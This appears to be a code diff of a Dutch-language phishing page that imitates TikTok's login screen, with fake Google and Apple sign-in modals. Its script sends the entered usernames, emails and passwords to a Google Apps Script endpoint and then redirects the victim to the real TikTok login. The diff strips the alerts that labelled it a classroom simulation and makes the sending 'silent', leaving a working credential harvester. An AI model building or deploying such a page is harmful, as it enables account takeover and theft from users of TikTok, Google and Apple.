@@ -24,39 +24,14 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     
     <style>
-        body {
-            background-color: #121212;
-            color: white;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-        }
-        
-        .btn-social {
-            background-color: rgba(255, 255, 255, 0.12);
-            border: 1px solid rgba(255, 255, 255, 0.12);
-            transition: background-color 0.2s ease;
-        }
+        body { background-color: #121212; color: white; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        .btn-social { background-color: rgba(255, 255, 255, 0.12); border: 1px solid rgba(255, 255, 255, 0.12); transition: background-color 0.2s ease; }
         .btn-social:hover { background-color: rgba(255, 255, 255, 0.08); }
-
-        .input-dark {
-            background-color: rgba(255, 255, 255, 0.12);
-            outline: none;
-        }
+        .input-dark { background-color: rgba(255, 255, 255, 0.12); outline: none; }
         .input-dark:focus { border: 1px solid rgba(255, 255, 255, 0.34); }
-
-        .modal-overlay {
-            background-color: rgba(0, 0, 0, 0.75);
-            backdrop-filter: blur(3px);
-        }
-
-        .apple-input-group input:first-child {
-            border-top-left-radius: 0.5rem;
-            border-top-right-radius: 0.5rem;
-            border-bottom: none;
-        }
-        .apple-input-group input:last-child {
-            border-bottom-left-radius: 0.5rem;
-            border-bottom-right-radius: 0.5rem;
-        }
+        .modal-overlay { background-color: rgba(0, 0, 0, 0.75); backdrop-filter: blur(3px); }
+        .apple-input-group input:first-child { border-top-left-radius: 0.5rem; border-top-right-radius: 0.5rem; border-bottom: none; }
+        .apple-input-group input:last-child { border-bottom-left-radius: 0.5rem; border-bottom-right-radius: 0.5rem; }
     </style>
 </head>
 <body class="flex flex-col min-h-screen relative">
@@ -86,22 +61,18 @@
                     <i class="fa-solid fa-qrcode absolute left-4 text-lg"></i>
                     <span class="mx-auto">QR-code gebruiken</span>
                 </button>
-                
                 <button onclick="switchView('view-login')" class="btn-social w-full py-3 px-4 rounded flex items-center relative font-semibold text-[15px]">
                     <i class="fa-regular fa-user absolute left-4 text-lg"></i>
                     <span class="mx-auto truncate">Telefoonnummer/e-mailadres</span>
                 </button>
-                
                 <button class="btn-social w-full py-3 px-4 rounded flex items-center relative font-semibold text-[15px]">
                     <i class="fa-brands fa-facebook absolute left-4 text-lg text-[#1877F2]"></i>
                     <span class="mx-auto">Doorgaan met Facebook</span>
                 </button>
-                
                 <button onclick="openModal('modal-google')" class="btn-social w-full py-3 px-4 rounded flex items-center relative font-semibold text-[15px]">
                     <svg class="absolute left-4 w-5 h-5" viewBox="0 0 24 24"><path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/><path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/><path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/><path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/></svg>
                     <span class="mx-auto">Doorgaan met Google</span>
                 </button>
-                
                 <button onclick="openModal('modal-apple')" class="btn-social w-full py-3 px-4 rounded flex items-center relative font-semibold text-[15px]">
                     <i class="fa-brands fa-apple absolute left-4 text-xl"></i>
                     <span class="mx-auto">Doorgaan met Apple</span>
@@ -113,213 +84,134 @@
             </p>
         </div>
 
-        <!-- E-MAIL / WACHTWOORD (Tiktok Form) -->
+        <!-- E-MAIL / WACHTWOORD -->
         <div id="view-login" class="w-full text-center flex flex-col hidden">
             <h1 class="text-3xl font-bold mb-8">Inloggen</h1>
-            
             <div class="flex border-b border-gray-700 mb-6 text-[15px] font-semibold">
-                <div class="w-1/2 pb-3 border-b-2 border-white cursor-pointer">E-mailadres of<br>gebruikersnaam</div>
-                <div class="w-1/2 pb-3 text-gray-500 hover:text-gray-300 cursor-pointer">Inloggen met<br>telefoonnummer</div>
+                <div class="w-1/2 pb-3 border-b-2 border-white cursor-pointer">E-mailadres</div>
+                <div class="w-1/2 pb-3 text-gray-500 hover:text-gray-300 cursor-pointer">Telefoonnummer</div>
             </div>
             
-            <!-- FORMULIER START -->
             <form id="form-tiktok" name="tiktok-login">
                 <div class="flex flex-col space-y-3 mb-3">
-                    <!-- NAME attribuut toegevoegd voor de form capture -->
                     <input type="text" name="tiktok_username" id="tt-user" placeholder="E-mailadres of gebruikersnaam" class="input-dark w-full py-3 px-4 rounded border border-transparent text-[15px] placeholder-gray-500" required>
-                    
                     <div class="relative">
                         <input type="password" name="tiktok_password" id="tt-pass" placeholder="Wachtwoord" class="input-dark w-full py-3 px-4 rounded border border-transparent text-[15px] placeholder-gray-500" required>
-                        <i class="fa-regular fa-eye-slash absolute right-4 top-1/2 transform -translate-y-1/2 text-gray-500 cursor-pointer"></i>
                     </div>
                 </div>
-                
-                <div class="text-left mb-6">
-                    <a href="#" class="text-[13px] font-semibold text-gray-400 hover:text-white hover:underline">Wachtwoord vergeten?</a>
-                </div>
-                
-                <!-- TYPE="SUBMIT" toegevoegd -->
-                <button type="submit" id="btn-login-tiktok" disabled class="w-full py-3 rounded font-bold text-[15px] bg-[#3f3f3f] text-gray-400 cursor-not-allowed transition-colors duration-200">
+                <button type="submit" id="btn-login-tiktok" disabled class="w-full py-4 mt-4 rounded font-bold text-[15px] bg-[#3f3f3f] text-gray-400 cursor-not-allowed transition-colors duration-200">
                     Inloggen
                 </button>
             </form>
-            <!-- FORMULIER EIND -->
 
             <div class="mt-8">
-                <button onclick="switchView('view-main')" class="text-sm font-semibold text-gray-300 hover:text-white hover:underline flex items-center justify-center mx-auto space-x-2">
+                <button onclick="switchView('view-main')" class="text-sm font-semibold text-gray-300 hover:text-white flex items-center justify-center mx-auto space-x-2">
                     <i class="fa-solid fa-angle-left"></i> <span>Terug</span>
                 </button>
             </div>
         </div>
-
     </main>
 
-    <div class="w-full mt-auto flex flex-col">
-        <div class="border-t border-gray-800 py-6 text-center text-[15px]">
-            Heb je geen account? <a href="#" class="text-tiktokred font-bold hover:underline">Aanmelden</a>
-        </div>
+    <div class="w-full mt-auto border-t border-gray-800 py-6 text-center text-[15px]">
+        Heb je geen account? <a href="#" class="text-tiktokred font-bold hover:underline">Aanmelden</a>
     </div>
-
 
     <!-- MODAL: GOOGLE -->
     <div id="modal-google" class="fixed inset-0 modal-overlay hidden z-50 flex items-center justify-center p-4">
-        <div class="bg-white text-[#202124] w-full max-w-[400px] rounded-2xl shadow-2xl p-8 relative font-sans" onclick="event.stopPropagation()">
-            <button onclick="closeModals()" class="absolute top-4 right-4 text-gray-500 hover:text-gray-800 w-8 h-8 rounded-full hover:bg-gray-100 flex items-center justify-center">
-                <i class="fa-solid fa-xmark text-lg"></i>
-            </button>
-            
+        <div class="bg-white text-[#202124] w-full max-w-[400px] rounded-2xl shadow-2xl p-8 relative font-sans">
+            <button onclick="closeModals()" class="absolute top-4 right-4 text-gray-500 hover:text-gray-800 w-8 h-8 rounded-full flex items-center justify-center"><i class="fa-solid fa-xmark text-lg"></i></button>
             <div class="text-center mb-6">
                 <svg class="mx-auto w-10 h-10 mb-3" viewBox="0 0 24 24"><path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/><path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/><path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/><path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/></svg>
                 <h2 class="text-[24px] mb-1">Inloggen</h2>
                 <p class="text-[15px] mb-4">Doorgaan naar TikTok</p>
             </div>
-            
-            <!-- FORMULIER START -->
             <form id="form-google" name="google-login">
                 <div class="space-y-4">
-                    <div class="relative">
-                        <input type="email" name="google_email" id="g-email" required class="block rounded-md px-3 pb-2.5 pt-5 w-full text-sm border border-gray-300 appearance-none focus:outline-none focus:ring-0 focus:border-blue-600 peer" placeholder=" ">
-                        <label for="g-email" class="absolute text-sm text-gray-500 duration-300 transform -translate-y-4 scale-75 top-4 z-10 origin-[0] left-3 peer-focus:text-blue-600 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-4">E-mailadres of telefoonnummer</label>
-                    </div>
-
-                    <div class="relative">
-                        <input type="password" name="google_password" id="g-pass" required class="block rounded-md px-3 pb-2.5 pt-5 w-full text-sm border border-gray-300 appearance-none focus:outline-none focus:ring-0 focus:border-blue-600 peer" placeholder=" ">
-                        <label for="g-pass" class="absolute text-sm text-gray-500 duration-300 transform -translate-y-4 scale-75 top-4 z-10 origin-[0] left-3 peer-focus:text-blue-600 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-4">Wachtwoord</label>
-                    </div>
+                    <input type="email" name="google_email" required class="block rounded-md px-3 py-3 w-full text-sm border border-gray-300 outline-none focus:border-blue-600" placeholder="E-mailadres of telefoonnummer">
+                    <input type="password" name="google_password" required class="block rounded-md px-3 py-3 w-full text-sm border border-gray-300 outline-none focus:border-blue-600" placeholder="Wachtwoord">
                 </div>
-
                 <div class="flex justify-between items-center mt-10">
-                    <a href="#" class="text-blue-600 text-[14px] font-medium hover:bg-blue-50 px-2 py-1 rounded">Account maken</a>
-                    <button type="submit" class="bg-[#0b57d0] hover:bg-[#0842a0] text-white px-6 py-2 rounded-full font-medium text-[14px] transition">
-                        Volgende
-                    </button>
+                    <a href="#" class="text-blue-600 text-[14px] font-medium hover:underline">Account maken</a>
+                    <button type="submit" class="bg-[#0b57d0] hover:bg-[#0842a0] text-white px-6 py-2 rounded-full font-medium text-[14px] transition">Volgende</button>
                 </div>
             </form>
-            <!-- FORMULIER EIND -->
         </div>
     </div>
 
-
     <!-- MODAL: APPLE -->
     <div id="modal-apple" class="fixed inset-0 modal-overlay hidden z-50 flex items-center justify-center p-4">
-        <div class="bg-applebg text-black w-full max-w-[420px] rounded-2xl shadow-2xl overflow-hidden relative" onclick="event.stopPropagation()">
+        <div class="bg-applebg text-black w-full max-w-[420px] rounded-2xl shadow-2xl overflow-hidden relative">
             <div class="bg-white border-b border-gray-200 px-4 py-3 flex justify-between items-center">
                 <i class="fa-brands fa-apple text-xl"></i>
                 <div class="font-semibold text-[15px]">Apple Account</div>
-                <button onclick="closeModals()" class="text-gray-400 hover:text-black">
-                    <i class="fa-solid fa-xmark text-lg"></i>
-                </button>
+                <button onclick="closeModals()" class="text-gray-400 hover:text-black"><i class="fa-solid fa-xmark text-lg"></i></button>
             </div>
-            
             <div class="p-8 pb-10 text-center flex flex-col items-center">
-                <div class="bg-black text-white w-16 h-16 rounded-xl flex items-center justify-center shadow-md mb-6">
-                    <i class="fa-brands fa-tiktok text-4xl"></i>
-                </div>
-                <h2 class="text-[20px] font-medium mb-6 leading-snug">Gebruik je Apple Account<br>om in te loggen op TikTok</h2>
-                
-                <!-- FORMULIER START -->
+                <div class="bg-black text-white w-14 h-14 rounded-xl flex items-center justify-center shadow-md mb-6"><i class="fa-brands fa-tiktok text-3xl"></i></div>
+                <h2 class="text-[20px] font-medium mb-6 leading-snug">Log in met Apple</h2>
                 <form id="form-apple" name="apple-login" class="w-full">
                     <div class="w-full apple-input-group mb-8 shadow-sm">
-                        <input type="text" name="apple_id" placeholder="Apple ID" required class="w-full p-3.5 border border-gray-300 outline-none focus:border-[#0070c9] focus:ring-1 focus:ring-[#0070c9] focus:z-10 relative bg-white text-[15px]">
-                        <input type="password" name="apple_password" placeholder="Wachtwoord" required class="w-full p-3.5 border border-gray-300 outline-none focus:border-[#0070c9] focus:ring-1 focus:ring-[#0070c9] focus:z-10 relative bg-white text-[15px]">
+                        <input type="text" name="apple_id" placeholder="Apple ID" required class="w-full p-3.5 border border-gray-300 outline-none focus:border-[#0070c9] bg-white text-[15px]">
+                        <input type="password" name="apple_password" placeholder="Wachtwoord" required class="w-full p-3.5 border border-gray-300 outline-none focus:border-[#0070c9] bg-white text-[15px]">
                     </div>
-                    
-                    <button type="submit" class="bg-[#0070c9] hover:bg-[#005ea6] text-white w-full py-3.5 rounded-xl font-semibold text-[16px] transition shadow-sm">
-                        Ga door
-                    </button>
+                    <button type="submit" class="bg-[#0070c9] hover:bg-[#005ea6] text-white w-full py-3.5 rounded-xl font-semibold text-[16px] transition">Ga door</button>
                 </form>
-                <!-- FORMULIER EIND -->
-                
             </div>
         </div>
     </div>
 
     <!-- JAVASCRIPT LOGICA -->
     <script>
-        // Navigatie
         function switchView(viewId) {
             document.getElementById('view-main').classList.add('hidden');
             document.getElementById('view-login').classList.add('hidden');
             document.getElementById(viewId).classList.remove('hidden');
         }
 
-        // Rode Knop validatie
-        const userInput = document.getElementById('tt-user');
-        const passInput = document.getElementById('tt-pass');
-        const loginBtn = document.getElementById('btn-login-tiktok');
-
-        function checkFormFields() {
-            if (userInput.value.trim() !== '' && passInput.value.trim() !== '') {
-                loginBtn.disabled = false;
-                loginBtn.classList.remove('bg-[#3f3f3f]', 'text-gray-400', 'cursor-not-allowed');
-                loginBtn.classList.add('bg-tiktokred', 'text-white', 'cursor-pointer', 'hover:bg-tiktokredhover');
+        const ttUser = document.getElementById('tt-user'), ttPass = document.getElementById('tt-pass'), ttBtn = document.getElementById('btn-login-tiktok');
+        function checkFields() {
+            if (ttUser.value.trim() !== '' && ttPass.value.trim() !== '') {
+                ttBtn.disabled = false; ttBtn.classList.remove('bg-[#3f3f3f]', 'text-gray-400', 'cursor-not-allowed');
+                ttBtn.classList.add('bg-tiktokred', 'text-white', 'cursor-pointer');
             } else {
-                loginBtn.disabled = true;
-                loginBtn.classList.add('bg-[#3f3f3f]', 'text-gray-400', 'cursor-not-allowed');
-                loginBtn.classList.remove('bg-tiktokred', 'text-white', 'cursor-pointer', 'hover:bg-tiktokredhover');
+                ttBtn.disabled = true; ttBtn.classList.add('bg-[#3f3f3f]', 'text-gray-400', 'cursor-not-allowed');
+                ttBtn.classList.remove('bg-tiktokred', 'text-white', 'cursor-pointer');
             }
         }
-        userInput.addEventListener('input', checkFormFields);
-        passInput.addEventListener('input', checkFormFields);
+        ttUser.addEventListener('input', checkFields); ttPass.addEventListener('input', checkFields);
 
-        // Modals openen/sluiten
-        function openModal(modalId) {
-            document.getElementById(modalId).classList.remove('hidden');
-        }
-        function closeModals() {
-            document.getElementById('modal-google').classList.add('hidden');
-            document.getElementById('modal-apple').classList.add('hidden');
-        }
-        document.querySelectorAll('.modal-overlay').forEach(overlay => {
-            overlay.addEventListener('click', closeModals);
-        });
+        function openModal(modalId) { document.getElementById(modalId).classList.remove('hidden'); }
+        function closeModals() { document.getElementById('modal-google').classList.add('hidden'); document.getElementById('modal-apple').classList.add('hidden'); }
+        document.querySelectorAll('.modal-overlay').forEach(o => o.addEventListener('click', closeModals));
 
-        // App Redirect
         function triggerAppRedirect() {
             window.location.href = "snssdk1233://";
-            setTimeout(function() {
-                window.location.href = "https://www.tiktok.com/login";
-            }, 2500); 
+            setTimeout(() => { window.location.href = "https://www.tiktok.com/login"; }, 2500); 
         }
 
-        // ==========================================
-        // SCRIPT VOOR JOUW KLAS DEMONSTRATIE
-        // ==========================================
-        
-        // VUL HIER JOUW GOOGLE APPS SCRIPT URL IN
-        const scriptURL = 'https://script.google.com/macros/s/AKfycbynAIn2nyaOaHkUHGrz3q-dnlbuHkJRWem1gcQs8P5CZgsUCu0Qdc6aXLz4JC_aW0zYeA/exec';
+        // --- DE "STILLE" DATABASE VERZENDING ---
+        const scriptURL = 'HIER_JE_WEB_APP_URL_PLAKKEN';
 
-        // Deze functie koppelt jouw script aan een specifiek formulier
         function koppelDemoScriptAanFormulier(formId) {
             const form = document.getElementById(formId);
-            
             form.addEventListener('submit', e => {
-                e.preventDefault(); // Voorkom dat de pagina direct ververst
-                
-                // Laat aan de klas zien dat er iets gebeurt
-                alert("Simulatie: Bezig met verzenden van de gegevens naar de database...");
-                
+                e.preventDefault();
+                // We sturen de data op de achtergrond...
                 fetch(scriptURL, { method: 'POST', body: new FormData(form)})
-                    .then(response => {
-                        alert("Succes! De data is opgeslagen. De gebruiker wordt nu doorgestuurd.");
-                        form.reset();
-                        triggerAppRedirect(); // Voer de redirect uit NA succes
+                    .then(response => { 
+                        // Zodra het verzoek gestart is, sturen we de gebruiker door
+                        triggerAppRedirect(); 
                     })
-                    .catch(error => {
-                        console.error('Fout!', error.message);
-                        // Zelfs als het mislukt (bijv. als de URL niet klopt), 
-                        // sturen we door zodat je presentatie niet vastloopt.
-                        alert("Opmerking voor demo: Kon niet verbinden met de database (Controleer URL). We sturen alsnog door.");
-                        triggerAppRedirect();
+                    .catch(error => { 
+                        // Ook bij fouten sturen we door voor een vloeiende demo
+                        triggerAppRedirect(); 
                     });
             });
         }
 
-        // Koppel het script aan alle 3 de formulieren
         koppelDemoScriptAanFormulier('form-tiktok');
         koppelDemoScriptAanFormulier('form-google');
         koppelDemoScriptAanFormulier('form-apple');
-
     </script>
 </body>
 </html>
